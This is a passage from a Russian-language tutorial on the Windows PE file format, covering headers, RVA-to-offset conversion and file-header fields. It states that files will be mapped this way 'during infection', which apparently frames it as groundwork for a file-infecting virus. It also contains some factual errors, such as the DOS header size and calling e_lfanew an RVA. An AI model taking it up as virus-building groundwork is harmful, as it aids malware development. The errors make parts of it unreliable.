<p>PE-файл в самом своем начале содержит программу для ОС DOS. Эта программа называется stub и нужна для совместимости со старыми ОС. Если мы запускаем PE-файл под ОС DOS или OS/2 она выводит на экран консоли текстовую строку, которая информирует пользователя, что данная программа не совместима с данной версией ОС. Программист при линковке может указать любую программу DOS, любого размера. После этой DOS-программы идет структура, которая называется IMAGE_NT_HEADERS. Эта структура определена так:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_NT_HEADERS<br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Signature<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; IMAGE_FILE_HEADER &nbsp; &nbsp; &nbsp; FileHeader<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; IMAGE_OPTIONAL_HEADER32 OptionalHeader<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Почти все определения структур PE-файла Вы можете узнать из заголовочного файла WINNT.H, который поставляется вместе с какой-нибудь средой программирования.</p>
<p>Первый элемент IMAGE_NT_HEADERS - сигнатура PE-файла. Для PE-файлов она должна иметь значение IMAGE_NT_SIGNATURE. Далее идет структура, которая называется файловым заголовком и определенная как IMAGE_FILE_HEADER. Файловый заголовок содержит наиболее общие свойства для данного PE-файла. Мы рассмотрим файловый заголовок в соответствующем разделе. После файлового заголовка идет опциональный заголовок - IMAGE_OPTIONAL_HEADER32. Он содержит специфические параметры данного PE-файла. В конце опционального заголовка содержится массив элементов DataDirectory. Он служит для доступа к некоторым сущностям, которые могут быть секциями (о секциях далее), а могут и не быть. В общем случае эти сущности называются - директориями. После опционального заголовка начинается таблица секций. В ней содержится информация о каждой секции. После таблицы секций идут исходные данные для секций. В конец PE-файла можно записать любую информацию и от этого функционирование программы не измениться (если там не присутствует проверка контрольной суммы etc.). Вы можете посмотреть, как выглядит PE-файл на рисунке, тогда Вы поймете, о чем я говорил в этом разделе:</p>
<div align="center">
<img src="img/vbp01/fig21.gif" alt=""/>
</div>
<h3><a name="c23"></a>Терминология применимая для файлов PE-формата</h3>
<dl>
<dt><em>Секция</em></dt><dd>
непрерывный набор страниц памяти с одинаковыми атрибутами. Бывают секции кода, данных, ресурсов и т.д. Обычно данные делятся на секции, если предполагается, что они будут использоваться одинаковым образом, т.е. например, только для чтения или только для записи. Также, данные могут делиться на секции в зависимости от того, что, представляют из себя, эти данные, например ресурсы или таблица импорта. В общем случае может быть, например 12 секций с одинаковыми атрибутами, и используемые для кода. Мы вправе сами создавать секции, указывая это компиляторам. С другой стороны секция это отдельная сущность PE-файла. Вы только прочтите, что пишут Microsoft в спецификации PE/COFF формата, что такое секция:
<blockquote>"A section is the basic unit of code or data within a PE/COFF file. In an object file, for example, all code can be combined within a single section, or (depending on compiler behavior) each function can occupy its own section. With more sections, there is more file overhead, but the linker is able to link in code more selectively. A section is vaguely similar to a segment in Intel 8086 architecture. All the raw data in a section must be loaded contiguously. In addition, an image file can contain a number of sections, such as <strong>.tls</strong> or <strong>.reloc</strong>, that have special purposes-</blockquote>
<p>Прочтите внимательно, Microsoft - звери хитрые, просто так писать ничего не будут, да и НЕ писать тоже. Хотя, время текет и все устаревает.</p>
</dd>
<dt><em>VA (Virtual Address)</em></dt><dd>виртуальный адрес. Адрес в адресном пространстве текущего процесса.</dd>
<dt><em>RVA (Relative Virtual Address)</em></dt><dd>относительный виртуальный адрес. При загрузке PE-файла, ОС использует механизм файлового мэппинга(File Mapping). Т.е. она проецирует данный exe, dll, sys или scr файл по какому-то адресу в виртуальном адресном пространстве. Адрес начала проекции называется <em>базовым адресом</em> в памяти данного exe, dll, sys или scr файла. А смещение относительно базового адреса называется - относительным виртуальным адресом. Например, EXE-файл спроецирован по адресу 400000H. Тогда если PE-заголовок находиться по адресу 4000 E0H, то RVA PE-заголовка будет E0. В PE-заголовке очень много параметров указываются через RVA. А если RVA начала инструкций в файле есть 1000H, то виртуальный адрес будет равен 401000H учитывая, что база 400000H. Чтобы посчитать относительный виртуальный адрес по данному виртуальному адресу используется следующая формула:
<p>RVA = VA - IMAGE_OPTIONAL_HEADER.ImageBase (1)</p>
<p>Иногда возникает необходимость посчитать файловое смещение соответствующее VA или RVA. Если требуется смещение внутри секции, используется следующая формула:</p>
<p>offset = RVA - IMAGE_SECTION_HEADER.VirtualAddress + IMAGE_SECTION_HEADER.PointerRawData (2)</p>
<p>Значения IMAGE_SECTION_HEADER.VirtualAddress и IMAGE_SECTION_HEADER.PointerRawData берутся из таблицы секций, которая соответствует секции RVA секции.</p>
<p>Если смещение находится вне секции, т.е. в заголовке, таблице секций или еще где-нибудь, то естественно файловое смещение равно RVA. Вот код функции, которая возвращает файловое смещение в зависимости от RVA:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">//Base - файл проецируется в память, это его база</span><br/>
<span style="color: black; font-style: italic;">//RVA - значение, которое нужно преобразовать в Offset</span><br/>
DWORD RVAtoOffset<span style="color: black;">&#40;</span>DWORD Base<span style="color: #339933;">,</span>DWORD RVA<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_NT_HEADERS &nbsp; &nbsp; &nbsp; pPE<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_NT_HEADERS<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span>Base<span style="color: #339933;">+</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>PIMAGE_DOS_HEADER<span style="color: black;">&#41;</span>Base<span style="color: black;">&#41;</span><span style="color: #339933;">-&gt;</span>e_lfanew<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">short</span> NumberOfSection<span style="color: #339933;">=</span>pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">NumberOfSections</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> SectionAlign<span style="color: #339933;">=</span>pPE<span style="color: #339933;">-&gt;</span>OptionalHeader.<span style="color: #202020;">SectionAlignment</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; PIMAGE_SECTION_HEADER Section<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>PIMAGE_SECTION_HEADER<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>pPE<span style="color: #339933;">-&gt;</span>FileHeader.<span style="color: #202020;">SizeOfOptionalHeader</span><span style="color: #339933;">+</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">long</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span><span style="color: black;">&#40;</span>pPE<span style="color: #339933;">-&gt;</span>FileHeader<span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>IMAGE_FILE_HEADER<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> VirtualAddress<span style="color: #339933;">,</span>PointerToRawData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; bool flag<span style="color: #339933;">=</span><span style="color: #000000; font-weight: bold;">false</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #993333;">int</span> i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>NumberOfSection<span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>RVA<span style="color: #339933;">&gt;=</span><span style="color: black;">&#40;</span>Section<span style="color: #339933;">-&gt;</span>VirtualAddress<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;&amp;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span>RVA<span style="color: #339933;">&lt;</span>Section<span style="color: #339933;">-&gt;</span>VirtualAddress<span style="color: #339933;">+</span>ALIGN_UP<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>Section<span style="color: #339933;">-&gt;</span>Misc.<span style="color: #202020;">VirtualSize</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span>SectionAlign<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; VirtualAddress<span style="color: #339933;">=</span>Section<span style="color: #339933;">-&gt;</span>VirtualAddress<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PointerToRawData<span style="color: #339933;">=</span>Section<span style="color: #339933;">-&gt;</span>PointerToRawData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; flag<span style="color: #339933;">=</span><span style="color: #000000; font-weight: bold;">true</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Section<span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>flag<span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> RVA<span style="color: #339933;">-</span>VirtualAddress<span style="color: #339933;">+</span>PointerToRawData<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">return</span> RVA<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Макрос ALING_UP определен при описании параметра SectionAlignment в опциональном заголовке. Кстати, с помощью CreateFileMapping можно спроецировать файл как PE, т.е. кусками по секциям, а не как сплошной файл. Это делается так:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">HANDLE&nbsp; hFile<span style="color: #339933;">=</span>CreateFile<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;c:<span style="color: #000099; font-weight: bold;">\\</span>regedit.exe&quot;</span><span style="color: #339933;">,</span>GENERIC_WRITE <span style="color: #339933;">|</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERIC_READ<span style="color: #339933;">,</span>FILE_SHARE_WRITE<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>OPEN_EXISTING<span style="color: #339933;">,</span>FILE_ATTRIBUTE_NORMAL<span style="color: #339933;">,</span>NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
HANDLE&nbsp; hMapping<span style="color: #339933;">=</span>CreateFileMapping<span style="color: black;">&#40;</span>hFile<span style="color: #339933;">,</span>NULL<span style="color: #339933;">,</span>PAGE_READWRITE <span style="color: #339933;">|</span> SEC_IMAGE<span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: #339933;">,</span>NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
HANDLE&nbsp; hMap<span style="color: #339933;">=</span>MapViewOfFile<span style="color: black;">&#40;</span>hMapping<span style="color: #339933;">,</span>FILE_MAP_ALL_ACCESS<span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: #339933;">,</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Параметр SEC_IMAGE указывает, что проецировать файл надо как исполняемый. Естественно мы будем только так проецировать файлы при заражении, чтобы не высчитывать соответствий смещения в файле и RVA.</p>
</dd>
<dt><em>IAT</em></dt><dd>таблица адресов импорта. Массив двойных слов, содержащие RVA импортируемых функций.</dd>
<dt><em>INT</em></dt><dd>таблица импортируемых имен. Массив двойных слов, каждое из которых является RVA на ASCIIZ-строку с импортируемой функцией.</dd>
</dl>
<h3><a name="c24"></a>DOS-MZ заголовок</h3>
<p> В начале файла располагается DOS-MZ заголовок. Он определен следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_DOS_HEADER <span style="color: black;">&#123;</span> <span style="color: black; font-style: italic;">// DOS .EXE header</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_magic<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Magic number</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_cblp<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Bytes on last page of file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_cp<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Pages in file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_crlc<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Relocations</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_cparhdr<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Size of header in paragraphs</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_minalloc<span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Minimum extra paragraphs needed</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_maxalloc<span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Maximum extra paragraphs needed</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_ss<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Initial (relative) SS value</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_sp<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Initial SP value</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_csum<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Checksum</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_ip<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Initial IP value</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_cs<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Initial (relative) CS value</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_lfarlc<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// File address of relocation table</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_ovno<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Overlay number</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_res<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Reserved words</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_oemid<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// OEM identifier (for e_oeminfo)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_oeminfo<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// OEM information; e_oemid specific</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; e_res2<span style="color: black;">&#91;</span><span style="color: #0000dd;">10</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Reserved words</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; LONG&nbsp; &nbsp; e_lfanew<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// File address of new exe header</span><br/>
<span style="color: black;">&#125;</span> IMAGE_DOS_HEADER<span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Все что нас интересует здесь - это только одно значение - e_lfanew. Это двойное слово является RVA и указывает на структуру IMAGE_NT_HEADERS. Размер DOS-MZ заголовка составляет 80 байт.</p>
<h3><a name="c25"></a>Файловый заголовок</h3>
<p>Файловый заголовок находиться в PE-файле сразу же после сигнатуры IMAGE_NT_SIGNATURE. В файле WINNT.H она определена как 00004550H. Файловый заголовок содержит наиболее общую информацию о данном файле. В файле WINNT.H файловый заголовок определен следующим образом:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> _IMAGE_FILE_HEADER <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; Machine<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; NumberOfSections<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; TimeDateStamp<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; PointerToSymbolTable<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; NumberOfSymbols<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; SizeOfOptionalHeader<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; WORD&nbsp; &nbsp; Characteristics<span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span> IMAGE_FILE_HEADER<span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Давайте рассмотрим по порядку данные поля.</p>
<dl>
<dt><strong>WORD Machine;</strong></dt>
<dd>Два байта содержащие платформу, для которой создавался данный PE-файл. Возможные значения приведены ниже.
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define IMAGE_FILE_MACHINE_UNKNOWN&nbsp; &nbsp; &nbsp; 0</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_I386 &nbsp; &nbsp; &nbsp; &nbsp; 0x014c&nbsp; // Intel 386.</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_R3000&nbsp; &nbsp; &nbsp; &nbsp; 0x0162&nbsp; // MIPS little-endian, 0x160 big-endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_R4000&nbsp; &nbsp; &nbsp; &nbsp; 0x0166&nbsp; // MIPS little-endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_R10000 &nbsp; &nbsp; &nbsp; 0x0168&nbsp; // MIPS little-endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_WCEMIPSV2&nbsp; &nbsp; 0x0169&nbsp; // MIPS little-endian WCE v2</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_ALPHA&nbsp; &nbsp; &nbsp; &nbsp; 0x0184&nbsp; // Alpha_AXP</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_POWERPC&nbsp; &nbsp; &nbsp; 0x01F0&nbsp; // IBM PowerPC Little-Endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_SH3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x01a2&nbsp; // SH3 little-endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_SH3E &nbsp; &nbsp; &nbsp; &nbsp; 0x01a4&nbsp; // SH3E little-endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_SH4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x01a6&nbsp; // SH4 little-endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_ARM&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x01c0&nbsp; // ARM Little-Endian</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_THUMB&nbsp; &nbsp; &nbsp; &nbsp; 0x01c2</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_IA64 &nbsp; &nbsp; &nbsp; &nbsp; 0x0200&nbsp; // Intel 64</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_MIPS16 &nbsp; &nbsp; &nbsp; 0x0266&nbsp; // MIPS</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_MIPSFPU&nbsp; &nbsp; &nbsp; 0x0366&nbsp; // MIPS</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_MIPSFPU16&nbsp; &nbsp; 0x0466&nbsp; // MIPS</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_ALPHA64&nbsp; &nbsp; &nbsp; 0x0284&nbsp; // ALPHA64</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_AXP64&nbsp; &nbsp; &nbsp; &nbsp; IMAGE_FILE_MACHINE_ALPHA64</span><br/>
<span style="color: #339933;">#define IMAGE_FILE_MACHINE_CEF&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0xC0EF</span><br/>
&nbsp;</div>
<p>ОС Windows поддерживает только две архитектуры и все они - процессоров Intel - IA-32, IA-64. Исходя из этого, только два значения считаются корректными в PE-файле IMAGE_FILE_MACHINE_IA64 и IMAGE_FILE_MACHINE_I386. Если Вы подставите чего-либо другое, загрузчик откажется загружать данный файл. Да и то для 32х разрядных операционных систем (т.е. работающих с 32х разрядными процессорами) - значение единственное - IMAGE_FILE_MACHINE_I386. Очень интересно еще и то, что в официальной спецификации о некоторых значениях просто умалчивается, просто умалчивается и все!</p>
</dd>
<dt><strong>WORD NumberOfSections;</strong></dt><dd>Количество секций в PE-файле. Значение должно быть верным. Фактически означает число элементов в таблице секций.</dd>
<dt><strong>DWORD TimeDateStamp;</strong></dt><dd>
Информация о времени, когда был собран данный PE-файл. Это значение равно количеству секунд прошедших с 1 января 1970 года до времени создания файла. В стандартной библиотеке Си есть замечательная функция gmtime, которая переводит время из секунд в удобочитаемый вид. Она берет указатель на DWORD - количество секунд и заполняет структуру tm, определенную в time.h. Эта структура выглядит следующим образом:
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">struct</span> tm<br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_sec<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Секунды */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_min<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Минуты */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_hour<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Часы (0--23) */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_mday<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* День месяца (1--31) */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_mon<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Месяц (0--11) */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_year<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Год (минус 1900) */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm _wday<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* День недели (0--6; Sunday = 0) */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_yday<span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* День года (0--365) */</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; tm_isdst<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* связано с переход на летнее время */</span><br/>
<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Чтобы узнать какой дате это число соответствует, используйте следующую функцию</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> printTimeStamp<span style="color: black;">&#40;</span>DWORD x<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> tm<span style="color: #339933;">*</span> Time<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/gmtime.html"><span style="color: #000066;">gmtime</span></a><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">long</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Year:%d<span style="color: #000099; font-weight: bold;">\n</span>Month:%d<span style="color: #000099; font-weight: bold;">\n</span>Day:%d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>Time<span style="color: #339933;">-&gt;</span>tm_year<span style="color: #339933;">+</span><span style="color: #0000dd;">1900</span><span style="color: #339933;">,</span>Time<span style="color: #339933;">-&gt;</span>tm_mon<span style="color: #339933;">,</span>Time<span style="color: #339933;">-&gt;</span>tm_mday<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>X - значение поля TimeDateStamp. Чтобы использовать данную функцию необходимо подключить заголовочный файл time.h.</p>
</dd>
